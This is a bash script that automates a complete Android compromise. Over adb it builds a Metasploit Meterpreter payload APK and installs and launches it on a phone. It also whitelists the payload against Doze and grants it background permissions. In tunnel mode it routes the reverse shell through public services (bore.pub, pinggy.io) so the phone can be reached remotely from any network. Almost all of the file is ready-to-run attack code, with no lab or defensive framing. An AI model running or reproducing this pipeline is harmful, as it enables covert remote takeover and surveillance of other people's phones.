#!/usr/bin/env bash
# =============================================================================
# psp_pipeline.sh — COMPLETE pipeline: adb connect -> tunnel -> payload -> meterpreter
#
# Usage:
#   ./pipeline/psp_pipeline.sh usb [SERIAL]        # USB/adb-reverse pipeline (most reliable)
#   ./pipeline/psp_pipeline.sh lan [LHOST] [LPORT] # LAN payload (works when phone->PC TCP OK)
#   ./pipeline/psp_pipeline.sh ngrok [PORT]        # ngrok tunnel pipeline (REMOTE access!)
#   ./pipeline/psp_pipeline.sh portmap [PORT]      # portmap.io tunnel pipeline (REMOTE)
#   ./pipeline/psp_pipeline.sh status              # show session/handler status
#   ./pipeline/psp_pipeline.sh cleanup             # stop handler + remove reverse rules
#
# Modes:
#   usb     — adb reverse tcp:LPORT tcp:LPORT + LHOST=127.0.0.1 payload.
#             Works over USB or adb-over-WiFi CHANNEL, even when LAN TCP is blocked.
#   tunnel  — ngrok/portmap.io TCP tunnel. Phone connects OUT to public endpoint,
#             so it works from ANYWHERE (4G/5G, different LAN). Use for Samsungs.
# =============================================================================
set -uo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
ADB="${ADB:-adb}"
LPORT="${LPORT:-4444}"

log()  { echo -e "\033[1;34m[pipeline]\033[0m $*"; }
ok()   { echo -e "\033[1;32m[ok]\033[0m $*"; }
warn() { echo -e "\033[1;33m[warn]\033[0m $*"; }
die()  { echo -e "\033[1;31m[error]\033[0m $*" >&2; exit 1; }

require_adb() { command -v "$ADB" >/dev/null || "$ROOT/adb" version >/dev/null 2>&1 || die "adb not found"; }

pick_serial() {
  # First arg SERIAL else first ready device
  if [ -n "$1" ]; then echo "$1"; return; fi
  "$ADB" devices | awk 'NR>1 && $2=="device" && $1!~/:/ {print $1; exit}'
}

# --------------------------------------------------------------------------
start_handler() {
  # Kill any previous handler
  pkill -f "msfconsole.*handler.rc" 2>/dev/null
  sleep 1
  log "starting msfconsole handler (LHOST=127.0.0.1 LPORT=$LPORT, background)"
  ( cd "$ROOT" && msfconsole -q -r pipeline/handler.rc > pipeline/msf.log 2>&1 & )
  sleep 12
  grep -q "Started reverse TCP handler" pipeline/msf.log && ok "handler up" || warn "handler not confirmed (see pipeline/msf.log)"
}

stop_handler() {
  pkill -f "msfconsole.*handler.rc" 2>/dev/null
  log "handler stopped"
}

# --------------------------------------------------------------------------
case "${1:-}" in

  usb)
    SERIAL="$2"
    require_adb
    SERIAL=$(pick_serial "$SERIAL")
    [ -z "$SERIAL" ] && die "no adb device. connect phone via USB or adb connect IP:5555"
    log "using device: $SERIAL"
    log "setting adb reverse tcp:$LPORT tcp:$LPORT"
    "$ADB" -s "$SERIAL" reverse tcp:"$LPORT" tcp:"$LPORT" || die "adb reverse failed"
    ok "reverse rule set"

    stop_handler
    # Build usb payload 127.0.0.1
    log "building payload LHOST=127.0.0.1 LPORT=$LPORT (FGS on)..."
    cd "$ROOT" && ./build_payload.sh --fgs 127.0.0.1 "$LPORT" /tmp/pipeline-usb.apk >/dev/null 2>&1 \
      || die "payload build failed (run manually to see errors)"
    ok "payload built: /tmp/pipeline-usb.apk"

    log "installing payload..."
    "$ADB" -s "$SERIAL" install -r /tmp/pipeline-usb.apk || warn "install exit=$?"
    "$ADB" -s "$SERIAL" shell pm grant com.metasploit.stage android.permission.POST_NOTIFICATIONS 2>/dev/null

    start_handler
    log "launching payload..."
    "$ADB" -s "$SERIAL" shell am force-stop com.metasploit.stage 2>/dev/null
    "$ADB" -s "$SERIAL" shell am start -n com.metasploit.stage/.MainActivity
    ok "payload launched. waiting for session... (msf.log tail)"
    sleep 8
    tail -5 pipeline/msf.log
    ;;

  tunnel|ngrok|port*|remote)
    TUNPORT="${2:-$LPORT}"
    require_adb
    SERIAL=$(pick_serial "")
    # 1) public TCP tunnel -> localhost:$LPORT (Pinggy: NO account; ngrok: needs token)
    if command -v bore >/dev/null && timeout 8 bash -c 'echo > /dev/tcp/bore.pub/7835' 2>/dev/null; then
        log "using bore.pub"
        ( bore local "$LPORT" --to bore.pub > pipeline/tunnel.log 2>&1 & )
        sleep 5
        PUBLIC_HOST="bore.pub"
        PUBLIC_PORT=$(grep -oP 'port \K[0-9]+' pipeline/tunnel.log | head -1)
        [ -z "$PUBLIC_PORT" ] && PUBLIC_PORT=46000
      elif command -v ssh >/dev/null; then
        # Pinggy — free, no account. Prints 'tcp://<host>:<port>'
        log "using pinggy.io tunnel..."
        ( ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -p 443 \
            -R 0:localhost:"$LPORT" tcp@a.pinggy.io > pipeline/tunnel.log 2>&1 & )
        sleep 15
        PUBLIC=$(grep -oP 'tcp://\K[^ ]+' pipeline/tunnel.log | head -1)
        [ -z "$PUBLIC" ] && die "pinggy URL not found in pipeline/tunnel.log: $(tail -3 pipeline/tunnel.log)"
        PUBLIC_HOST="${PUBLIC%%:*}"
        PUBLIC_PORT="${PUBLIC##*:}"
        ok "pinggy tunnel: $PUBLIC_HOST:$PUBLIC_PORT -> localhost:$LPORT"
      else
        die "no tunnel tool available (install bore or use pinggy)"
      fi
    # 2) build remote payload (FGS)
    log "building remote payload LHOST=$PUBLIC_HOST LPORT=$PUBLIC_PORT"
    cd "$ROOT" && ./build_payload.sh --fgs "$PUBLIC_HOST" "$PUBLIC_PORT" /tmp/pipeline-remote.apk >/dev/null 2>&1 \
      || die "payload build failed"
    ok "payload built: /tmp/pipeline-remote.apk"
    if [ -n "$SERIAL" ]; then
      log "installing + launching on $SERIAL"
      "$ADB" -s "$SERIAL" install -r /tmp/pipeline-remote.apk
      "$ADB" -s "$SERIAL" shell pm grant com.metasploit.stage android.permission.POST_NOTIFICATIONS 2>/dev/null
      "$ADB" -s "$SERIAL" shell dumpsys deviceidle whitelist +com.metasploit.stage 2>/dev/null
      "$ADB" -s "$SERIAL" shell cmd appops set com.metasploit.stage RUN_IN_BACKGROUND allow 2>/dev/null
      "$ADB" -s "$SERIAL" shell am force-stop com.metasploit.stage 2>/dev/null
      "$ADB" -s "$SERIAL" shell am start -n com.metasploit.stage/.MainActivity
    else
      warn "no device attached — payload ready at /tmp/pipeline-remote.apk, install manually"
    fi
    echo "PUBLIC_ENDPOINT=$PUBLIC_HOST:$PUBLIC_PORT" | tee pipeline/endpoint.txt
    ;;

  status)
    log "adb devices:"
    "$ADB" devices | grep -v '^List' | grep -v '^$' || true
    log "reverse rules:"
    "$ADB" reverse --list 2>/dev/null || true
    log "handler log tail:"
    tail -15 "$ROOT/pipeline/msf.log" 2>/dev/null || true
    ;;

  cleanup)
    "$ADB" reverse --remove-all 2>/dev/null || true
    stop_handler
    ok "cleaned"
    ;;

  *)
    echo "Usage: $0 {usb|ngrok|port|status|cleanup} [serial]"
    ;;
esac